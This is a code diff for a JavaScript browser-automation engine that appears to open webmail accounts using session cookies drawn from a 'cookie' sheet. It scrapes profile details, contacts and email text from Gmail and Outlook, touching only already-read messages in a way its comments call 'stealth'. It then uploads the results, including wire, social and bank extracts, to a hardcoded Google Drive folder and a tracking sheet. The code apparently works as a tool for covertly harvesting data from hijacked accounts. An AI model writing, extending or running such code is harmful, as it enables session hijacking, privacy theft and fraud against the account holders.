@@ -4,6 +4,7 @@ const aiService = new MultiProviderAI();
 import { launchBrowserWithSession, DOMHelpers } from '../app/socials/_shared/routeHelper.js';
 import { getSheetDataApi, updateSheetRowApi, ensureSheetColumns } from '../app/api/googlesheets.js';
 import { getPlatformConfig, getExtractor } from '../app/socials/social-extract/platforms.js';
+import { createOrUpdateJsonFile, getJsonContentFromFile } from '../app/api/googledrive.mjs';
 
 // ============================================================
 // SMART EXTRACT ENGINE
@@ -16,6 +17,7 @@ import { getPlatformConfig, getExtractor } from '../app/socials/social-extract/p
 
 const COOKIE_SHEET = 'cookie';
 const HUB_SHEET = 'hub';
+const HUB_FOLDER_ID = '1Xo6HALrBHOtky-d25OTdTgYtBXfV5Wwi';
 
 // Per-browserId in-flight guard so auto-extract and manual extract never race.
 if (!globalThis.__extractInFlight) globalThis.__extractInFlight = new Set();
@@ -117,19 +119,94 @@ async function extractPersonalInfo(page, platform) {
         }
     }
 
-    const domResult = await page.evaluate(() => {
+    const domResult = await page.evaluate((isGmail) => {
         const pick = (selectors) => {
             for (const sel of selectors) {
-                const el = document.querySelector(sel);
-                if (el && el.textContent.trim()) return el.textContent.trim();
+                try {
+                    const el = document.querySelector(sel);
+                    if (el && el.textContent.trim()) return el.textContent.trim();
+                } catch (e) { /* invalid selector, skip */ }
             }
             return '';
         };
-        const name = pick(['h1', '[class*="name"]', 'header [class*="name"]']);
-        const recoveryEmail = pick(['[href*="recovery"]', 'input[type="email"]']);
-        const phone = pick(['[href*="phone"]', '[class*="phone"]']);
-        return { name, recoveryEmail, phone, raw: document.body.textContent.trim().slice(0, 6000) };
-    });
+
+        let name = '';
+        let email = '';
+        let phone = '';
+        let birthday = '';
+        let gender = '';
+
+        if (isGmail) {
+            // Gmail personal-info: data-rid selectors from actual HTML
+            name = pick([
+                '[data-rid="10090"] .qqVS5',
+                '[data-rid="10090"]',
+                'h1',
+                '[class*="name"]',
+            ]);
+            email = pick([
+                '[data-rid="203"] .qqVS5',
+                '[data-rid="203"]',
+                '[href*="recovery"]',
+                'input[type="email"]',
+            ]);
+            phone = pick([
+                '[data-rid="204"] .qqVS5',
+                '[data-rid="204"]',
+                '[href*="phone"]',
+                '[class*="phone"]',
+            ]);
+            birthday = pick([
+                '[data-rid="205"] .qqVS5',
+                '[data-rid="205"]',
+            ]);
+            gender = pick([
+                '[data-rid="206"] .qqVS5',
+                '[data-rid="206"]',
+            ]);
+        } else {
+            // Microsoft profile: Fluent UI with data-bi-id and #profile selectors
+            name = pick([
+                '#profile.profile-page.personal-section.full-name',
+                '[data-bi-id="full-name"]',
+                'h1',
+                '[class*="name"]',
+            ]);
+            email = pick([
+                '[data-bi-id="email-address"]',
+                '[data-rid="203"] .qqVS5',
+                '[data-rid="203"]',
+                '[href*="recovery"]',
+                'input[type="email"]',
+            ]);
+            phone = pick([
+                '[data-bi-id="phone-number"]',
+                '[data-rid="204"] .qqVS5',
+                '[data-rid="204"]',
+                '[href*="phone"]',
+                '[class*="phone"]',
+            ]);
+            birthday = pick([
+                '[data-bi-id="birth-date"]',
+                '[data-rid="205"] .qqVS5',
+                '[data-rid="205"]',
+            ]);
+            gender = pick([
+                '[data-bi-id="gender"]',
+                '[data-rid="206"] .qqVS5',
+                '[data-rid="206"]',
+            ]);
+        }
+
+        return {
+            name,
+            recoveryEmail: email,
+            phone,
+            birthday,
+            gender,
+            raw: document.body.textContent.trim().slice(0, 6000),
+        };
+    }, platform === 'gmail');
 
     let aiResult = null;
     try {
@@ -142,6 +219,8 @@ async function extractPersonalInfo(page, platform) {
         name: domResult.name || aiResult?.name || '',
         recoveryEmail: domResult.recoveryEmail || aiResult?.recoveryEmail || '',
         phone: domResult.phone || aiResult?.phone || '',
+        birthday: domResult.birthday || '',
+        gender: domResult.gender || '',
         altEmails: aiResult?.altEmails || [],
         storageUsed: aiResult?.storageUsed || '',
         createdAt: aiResult?.createdAt || '',
@@ -190,39 +269,43 @@ async function extractBoxSummary(page, platform) {
 
 // ==================== Contacts (pagination) ====================
 
-const CONTACTS_SITES = {
-    gmail: 'https://contacts.google.com/',
-    outlook: 'https://outlook.live.com/people/0/',
-};
-
 async function extractContacts(page, platform, maxContacts = 200) {
-    const url = CONTACTS_SITES[platform] || CONTACTS_SITES.gmail;
     const contacts = [];
     const seen = new Set();
 
+    if (platform === 'outlook') {
+        // Outlook: extract contacts from inbox messages (read only, stealth)
+        return await extractContactsFromOutlookInbox(page, maxContacts);
+    }
+
+    // Gmail: use contacts.google.com/frequent with correct selectors
     try {
-        await gotoRobust(page, url);
+        await gotoRobust(page, 'https://contacts.google.com/frequent');
 
         for (let i = 0; i < 8; i++) {
             const batch = await page.evaluate(() => {
-                const pick = (selectors) => {
-                    for (const sel of selectors) {
-                        const el = document.querySelector(sel);
-                        if (el && el.textContent.trim()) return el.textContent.trim();
-                    }
-                    return '';
-                };
                 const out = [];
-                const items = document.querySelectorAll('[role="listitem"], [class*="person"], [class*="contact-card"], [data-contact-id]');
-                items.forEach(el => {
-                    const name = pick(['[class*="name"]', 'h2', 'h3', 'span[class*="Name"]']);
-                    const emailEl = el.querySelector('a[href*="mailto:"]');
-                    const email = emailEl ? emailEl.getAttribute('href').replace('mailto:', '') : '';
-                    const phoneEl = el.querySelector('a[href*="tel:"]');
-                    const phone = phoneEl ? phoneEl.getAttribute('href').replace('tel:', '') : '';
-                    const companyEl = el.querySelector('[class*="company"], [class*="org"]');
+                // Gmail contacts: div.XXcuqd[role="presentation"] rows with div.JcPRM cells
+                const rows = document.querySelectorAll('div.XXcuqd[role="presentation"]');
+                rows.forEach(row => {
+                    // Name: div.AYDrSb with id attribute
+                    const nameEl = row.querySelector('div.AYDrSb');
+                    const name = nameEl?.textContent?.trim() || '';
+
+                    // Email: [data-email] attribute on chips
+                    const emailEl = row.querySelector('[data-email]');
+                    const email = emailEl?.getAttribute('data-email') || '';
+
+                    // Phone: [aria-describedby*="phone-column"]
+                    const phoneEl = row.querySelector('[aria-describedby*="phone-column"]');
+                    const phone = phoneEl?.textContent?.trim() || '';
+
+                    // Job/Company: [aria-describedby*="generated-tagline-column"]
+                    const jobEl = row.querySelector('[aria-describedby*="generated-tagline-column"]');
+                    const company = jobEl?.textContent?.trim() || '';
+
                     if (name || email) {
-                        out.push({ name, email, phone, company: companyEl?.textContent?.trim() || '' });
+                        out.push({ name, email, phone, company });
                     }
                 });
                 return out;
@@ -248,7 +331,6 @@ async function extractContacts(page, platform, maxContacts = 200) {
 
             if (contacts.length >= maxContacts) break;
 
-            // Scroll-based pagination for infinite-scroll lists, else next button.
             const prevCount = contacts.length;
             await page.evaluate(() => window.scrollBy(0, 1500));
             await sleep(1800);
@@ -260,7 +342,125 @@ async function extractContacts(page, platform, maxContacts = 200) {
             if (contacts.length === prevCount && !nextBtn) break;
         }
     } catch (e) {
-        logger.warn(`[smartExtract] contacts extraction failed: ${e.message}`);
+        logger.warn(`[smartExtract] gmail contacts extraction failed: ${e.message}`);
+    }
+
+    return contacts.slice(0, maxContacts);
+}
+
+/**
+ * Outlook contacts: extract from inbox messages. Only READ messages (no DLvHz class).
+ * Clicks into each message to parse sender/recipient from the inner template.
+ */
+async function extractContactsFromOutlookInbox(page, maxContacts = 200) {
+    const contacts = [];
+    const seen = new Set();
+
+    try {
+        await gotoRobust(page, 'https://outlook.live.com/mail/0/inbox');
+        await sleep(3000);
+
+        // Find READ messages only (div.lHRXq.hDNlA WITHOUT DLvHz class)
+        const readMessageIndexes = await page.evaluate(() => {
+            const rows = document.querySelectorAll('div[data-index]');
+            const readIndexes = [];
+            rows.forEach(row => {
+                // UNREAD has DLvHz class; READ does not
+                const isUnread = row.querySelector('.DLvHz') || row.classList.contains('DLvHz');
+                if (!isUnread) {
+                    const idx = row.getAttribute('data-index');
+                    if (idx !== null) readIndexes.push(idx);
+                }
+            });
+            return readIndexes;
+        });
+
+        logger.info(`[smartExtract] Found ${readMessageIndexes.length} READ messages in Outlook inbox`);
+
+        const maxToProcess = Math.min(readMessageIndexes.length, Math.ceil(maxContacts / 2));
+        for (let i = 0; i < maxToProcess; i++) {
+            if (contacts.length >= maxContacts) break;
+
+            try {
+                // Re-navigate to inbox each time (DOM may have changed)
+                if (i > 0) {
+                    await gotoRobust(page, 'https://outlook.live.com/mail/0/inbox');
+                    await sleep(2000);
+                }
+
+                // Click the READ message
+                const clicked = await page.evaluate((idx) => {
+                    const rows = document.querySelectorAll('div[data-index]');
+                    for (const row of rows) {
+                        if (row.getAttribute('data-index') === idx) {
+                            row.click();
+                            return true;
+                        }
+                    }
+                    return false;
+                }, readMessageIndexes[i]);
+
+                if (!clicked) continue;
+                await sleep(2500);
+
+                // Extract from inner message template
+                const messageData = await page.evaluate(() => {
+                    const getText = (sel) => document.querySelector(sel)?.textContent?.trim() || '';
+                    return {
+                        sender: getText('span[aria-label^="From:"]'),
+                        recipient: getText('span[aria-label^="To:"]'),
+                        subject: getText('span.TtcXM'),
+                        snippet: getText('span.ASFJj'),
+                        date: getText('span.qq2gS'),
+                        body: getText('div[aria-label="Message body"]'),
+                    };
+                });
+
+                // Parse sender email from "Name <email>" format
+                const parseEmail = (text) => {
+                    const match = text.match(/<([^>]+)>/) || text.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
+                    return match ? match[1] : '';
+                };
+                const parseName = (text) => {
+                    const match = text.match(/^"?([^"<]+)"?\s*</);
+                    return match ? match[1].trim() : text.split('<')[0].trim();
+                };
+
+                // Add sender as contact
+                const senderEmail = parseEmail(messageData.sender);
+                const senderName = parseName(messageData.sender);
+                if (senderEmail && !seen.has(senderEmail.toLowerCase())) {
+                    seen.add(senderEmail.toLowerCase());
+                    contacts.push({
+                        name: senderName,
+                        email: senderEmail,
+                        lastInteractionDate: messageData.date || '',
+                        relationshipSummary: '',
+                        interactionCount: 1,
+                        otherData: { phoneNumbers: [], company: '', notes: '' },
+                    });
+                }
+
+                // Add recipient as contact
+                const recipientEmail = parseEmail(messageData.recipient);
+                const recipientName = parseName(messageData.recipient);
+                if (recipientEmail && !seen.has(recipientEmail.toLowerCase())) {
+                    seen.add(recipientEmail.toLowerCase());
+                    contacts.push({
+                        name: recipientName,
+                        email: recipientEmail,
+                        lastInteractionDate: messageData.date || '',
+                        relationshipSummary: '',
+                        interactionCount: 1,
+                        otherData: { phoneNumbers: [], company: '', notes: '' },
+                    });
+                }
+            } catch (e) {
+                logger.warn(`[smartExtract] outlook message ${i} failed: ${e.message}`);
+            }
+        }
+    } catch (e) {
+        logger.warn(`[smartExtract] outlook contacts extraction failed: ${e.message}`);
     }
 
     return contacts.slice(0, maxContacts);
@@ -290,7 +490,7 @@ async function collectEmailTexts(page, platform, maxEmails = 30) {
             const rows = await page.evaluate((host) => {
                 const selectors = host.includes('google')
                     ? ['tr[role="row"]', '.zA', '.zE', '[role="row"]']
-                    : ['[role="option"]', '[class*="messageListItem"]', '[class*="Conversation"]'];
+                    : ['div[data-index]'];
                 const items = [];
                 for (const sel of selectors) {
                     document.querySelectorAll(sel).forEach(el => items.push(el));
@@ -298,10 +498,28 @@ async function collectEmailTexts(page, platform, maxEmails = 30) {
                 const out = [];
                 const seenInner = new Set();
                 for (const el of items) {
-                    const text = (el.textContent || '').trim().replace(/\s+/g, ' ');
-                    if (!text || seenInner.has(text)) continue;
-                    seenInner.add(text);
-                    out.push(text);
+                    // Outlook: skip UNREAD (has DLvHz class)
+                    if (!host.includes('google')) {
+                        const isUnread = el.querySelector('.DLvHz') || el.classList.contains('DLvHz');
+                        if (isUnread) continue;
+                    }
+                    // Extract structured data from Outlook messages
+                    if (!host.includes('google')) {
+                        const subject = el.querySelector('span.TtcXM')?.textContent?.trim() || '';
+                        const snippet = el.querySelector('span.ASFJj')?.textContent?.trim() || '';
+                        const sender = el.querySelector('span[aria-label^="From:"]')?.textContent?.trim() || '';
+                        const date = el.querySelector('span.qq2gS')?.textContent?.trim() || '';
+                        const text = [sender, subject, snippet, date].filter(Boolean).join(' | ');
+                        if (text && !seenInner.has(text)) {
+                            seenInner.add(text);
+                            out.push(text);
+                        }
+                    } else {
+                        const text = (el.textContent || '').trim().replace(/\s+/g, ' ');
+                        if (!text || seenInner.has(text)) continue;
+                        seenInner.add(text);
+                        out.push(text);
+                    }
                     if (out.length >= 15) break;
                 }
                 return out;
@@ -371,13 +589,27 @@ async function collectRecentEmails(page, platform, limit = 50) {
             const rows = await page.evaluate((host) => {
                 const selectors = host.includes('google')
                     ? ['tr[role="row"]', '.zA', '.zE']
-                    : ['[role="option"]', '[class*="messageListItem"]', '[class*="Conversation"]'];
+                    : ['div[data-index]'];
                 const out = [];
                 const seenInner = new Set();
                 for (const sel of selectors) {
                     document.querySelectorAll(sel).forEach(el => {
-                        const text = (el.textContent || '').trim().replace(/\s+/g, ' ');
-                        if (text && !seenInner.has(text)) { seenInner.add(text); out.push(text); }
+                        // Outlook: skip UNREAD (has DLvHz class)
+                        if (!host.includes('google')) {
+                            const isUnread = el.querySelector('.DLvHz') || el.classList.contains('DLvHz');
+                            if (isUnread) return;
+                        }
+                        if (!host.includes('google')) {
+                            const subject = el.querySelector('span.TtcXM')?.textContent?.trim() || '';
+                            const snippet = el.querySelector('span.ASFJj')?.textContent?.trim() || '';
+                            const sender = el.querySelector('span[aria-label^="From:"]')?.textContent?.trim() || '';
+                            const date = el.querySelector('span.qq2gS')?.textContent?.trim() || '';
+                            const text = [sender, subject, snippet, date].filter(Boolean).join(' | ');
+                            if (text && !seenInner.has(text)) { seenInner.add(text); out.push(text); }
+                        } else {
+                            const text = (el.textContent || '').trim().replace(/\s+/g, ' ');
+                            if (text && !seenInner.has(text)) { seenInner.add(text); out.push(text); }
+                        }
                     });
                 }
                 return out.slice(0, 40);
@@ -715,10 +947,31 @@ export async function runSmartExtract(browserId, category, username, platform) {
             data = await extractWire(session);
         }
 
-        // Ensure the hub column exists before writing (updateSheetRowApi skips unknown headers).
+        // Save full extract JSON to Google Drive folder: HUB_FOLDER_ID/browserId/(wire|social|bank)Extract.json
+        let driveRef = null;
+        try {
+            const fileName = `${column}.json`;
+            const driveResult = await createOrUpdateJsonFile(HUB_FOLDER_ID, browserId, fileName, data);
+            if (driveResult.success) {
+                driveRef = { fileId: driveResult.fileId, fileName };
+                logger.info(`[smartExtract] Saved ${column} to Drive: ${driveResult.fileId}`);
+            } else {
+                logger.warn(`[smartExtract] Drive save failed: ${driveResult.error}, falling back to cell storage`);
+            }
+        } catch (e) {
+            logger.warn(`[smartExtract] Drive save error: ${e.message}, falling back to cell storage`);
+        }
+
+        // Ensure the hub column exists before writing.
         await ensureSheetColumns(HUB_SHEET, [column, `${column}At`]);
+
+        // Write to hub: if Drive save succeeded, store reference; otherwise store full JSON
+        const cellValue = driveRef
+            ? JSON.stringify({ ...driveRef, size: JSON.stringify(data).length })
+            : JSON.stringify(data);
+
         const writeResult = await updateSheetRowApi(HUB_SHEET, 'submissionId', browserId, {
-            [column]: JSON.stringify(data),
+            [column]: cellValue,
             [`${column}At`]: new Date().toISOString(),
         });
 
